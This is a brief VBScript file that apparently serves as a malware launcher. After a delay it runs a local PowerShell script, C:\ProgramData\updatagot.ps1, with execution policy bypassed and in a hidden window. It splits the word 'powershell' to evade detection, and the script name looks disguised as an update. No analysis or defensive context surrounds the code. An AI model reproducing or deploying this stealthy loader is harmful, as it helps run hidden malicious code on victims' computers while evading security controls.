WScript.Sleep 3000
Dim shell,command
command = "pow" & "ershell -windo 1 -noexit -exec bypass -file ""C:\ProgramData\updatagot.ps1"""
Set shell = CreateObject("WScript.Shell")
shell.Run command,0
